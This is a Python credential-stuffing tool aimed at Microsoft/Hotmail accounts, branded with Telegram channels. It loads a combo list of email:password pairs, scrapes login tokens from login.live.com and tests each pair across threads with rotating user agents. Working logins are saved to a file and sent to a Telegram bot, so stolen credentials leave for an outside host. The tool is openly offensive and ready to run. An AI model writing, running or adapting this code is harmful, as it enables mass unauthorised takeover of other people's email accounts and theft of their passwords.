
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import re
import os
import uuid
from user_agent import generate_user_agent
from cfonts import render

E = '\033[1;31m'
G = '\033[1;35m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\033[1;34m'

bss = 0
uus = 0
hit = 0
bad = 0
total_checked = 0
TELEGRAM_BOT_TOKEN = ''
CHAT_ID = ''

def print_logo():
    K = render('{MICRO|SOFT}', colors=['white', 'blue'], align='center')
    print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {K}
    Kanal: @kahintool @KahinPhp
 
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')

def send_telegram_message(message):
    global TELEGRAM_BOT_TOKEN, CHAT_ID
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raise an error for HTTP error responses
    except requests.exceptions.RequestException:
        pass  

def checkHotmail(folo, email, password, opid, cobrandid, id_value, uaid, correlation_id, cookies):
    global hit, bad
    tim = int(time.time())

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': generate_user_agent(),
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    params = {
        'contextid': correlation_id,
        'opid': opid,
        'bk': tim,
        'uaid': uaid,
        'pid': '0',
    }

    data = f'ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={folo}&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}'

    req = requests.post('https://login.live.com/ppsecure/post.srf', params=params, cookies=cookies, headers=headers, data=data).cookies.get_dict()
    if '__Host-MSAAUTH' in req:
        hit += 1
        tlg = f"""
{F}╔══════════════════════════════════════════════════════════╗
{F}║{G}     🎉 **Başarılı Giriş**: {email}:{password}                 {F}
{F}╚══════════════════════════════════════════════════════════╝
"""
        print(F + tlg)
        with open('KAHIN-MICROSOFT-HIT.txt', 'a') as x:
            x.write(f'{email}:{password}\n')
        # Telegram
        message = f"⋘─────━𝐌𝐈𝐂𝐑𝐎𝐒𝐎𝐅𝐓━─────⋙\n𝐄𝐌𝐀𝐈𝐋  :  {email}\n𝐒𝐈𝐅𝐑𝐄  :  {password}\n𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @KahinPhp @kahintool\n⋘─────━𝐊𝐀𝐇𝐈N━─────⋙"
        send_telegram_message(message)
    else:
        bad += 1
        print(f"""
{F}╔══════════════════════════════════════════════════════════╗
{F}║{X}     🚫 **Kullanıcı Bulunamadı**: {email}                     {F}
{F}╚══════════════════════════════════════════════════════════╝
""")

def iferorrcokies():
    try:
        AH = requests.post(
            f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1715872213&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%{uuid.uuid4()}&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
            headers={'User-Agent': generate_user_agent()},
        )
        u = AH.text
        cookies = AH.cookies.get_dict()

        correlation_id_match = re.search(r"correlationId:'([a-f0-9\-]+)'", u)
        correlation_id = correlation_id_match.group(1) if correlation_id_match else None

        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', u)
        ppft = ppft_match.group(1) if ppft_match else None

        opid_match = re.search(r'opid=([a-fA-F0-9]+)', u)
        opid = opid_match.group(1) if opid_match else None

        id_match = re.search(r'id=([0-9]+)', u)
        id_value = id_match.group(1) if id_match else None

        cobrandid_match = re.search(r'cobrandid=([0-9]+)', u)
        cobrandid = cobrandid_match.group(1) if cobrandid_match else None

        uaid_match = re.search(r'uaid=([a-f0-9\-]+)', u)
        uaid = uaid_match.group(1) if uaid_match else None

        try:
            os.remove('micrsoftCokiler.txt')
            os.remove('micrsoftDiger.txt')
        except FileNotFoundError:
            pass

        with open('micrsoftCokiler.txt', 'a') as f:
            f.write(str(cookies) + '\n')
        with open('micrsoftDiger.txt', 'a') as t:
            t.write(f"{uaid}|{cobrandid}|{id_value}|{opid}|{ppft}|{correlation_id}\n")

    except Exception as e:
        print(f"Error in iferorrcokies: {e}")
        iferorrcokies()

def Check(email, password):
    global uus, bss, hit, bad, total_checked
    try:
        with open("micrsoftDiger.txt", "r") as f:
            for line in f:
                uaid, cobrandid, id_value, opid, ppft, correlation_id = line.strip().split('|')

        with open("micrsoftCokiler.txt", "r") as t:
            for line in t:
                cookies = eval(line.strip())

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'Connection': 'keep-alive',
            'Referer': 'https://login.live.com/',
            'User-Agent': generate_user_agent(),
        }

        params = {
            'uaid': uaid,
            'cobrandid': cobrandid,
            'id': id_value,
            'opid': opid,
            'vv': '700',
            'bk': str(int(time.time())),
        }

        response = requests.get('https://login.live.com/ppsecure/post.srf', headers=headers, params=params, cookies=cookies)
        if "WindowsLive.login" in response.text:
            uus += 1
            result = f"""
{F}╔══════════════════════════════════════════════════════════╗
{F}║{G}     ✅ **Kullanıcı Bulundu**: {email}                    {F}║
{F}╚══════════════════════════════════════════════════════════╝
            """
        else:
            bss += 1
            result = f"""
{F}╔══════════════════════════════════════════════════════════╗
{F}║{X}     🚫 **Kullanıcı Bulunamadı**: {email}                 {F}║
{F}╚══════════════════════════════════════════════════════════╝
            """

        print(result)
        checkHotmail(ppft, email, password, opid, cobrandid, id_value, uaid, correlation_id, cookies)

    except Exception as e:
        print(f"Error in Check function: {e}")
        iferorrcokies()

    total_checked += 1
    with open('denenenepostalar.txt', 'w') as f:
        f.write(f"Total accounts checked: {total_checked}\n")

def process_account(account):
    try:
        email, password = account.strip().split(':')
        Check(email, password)
    except ValueError:
        print(f"{E}Geçersiz formatta satır: {account.strip()}. Atlanıyor...")

def main():
    global TELEGRAM_BOT_TOKEN, CHAT_ID
    print_logo()
    try:
        TELEGRAM_BOT_TOKEN = input(f"{M}TOKEN GİRİN: ").strip()
        CHAT_ID = input(f"{M}ID GİRİN: ").strip()
        filename = input(f"{M}KOMBO DOSYA ADI GİRİN: ").strip()

        with open(filename, 'r') as file:
            accounts = file.readlines()

        with ThreadPoolExecutor(max_workers=6) as executor:
            executor.map(process_account, accounts)
        
    except FileNotFoundError:
        print(f"{E}Dosya bulunamadı.")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

if __name__ == "__main__":
    main()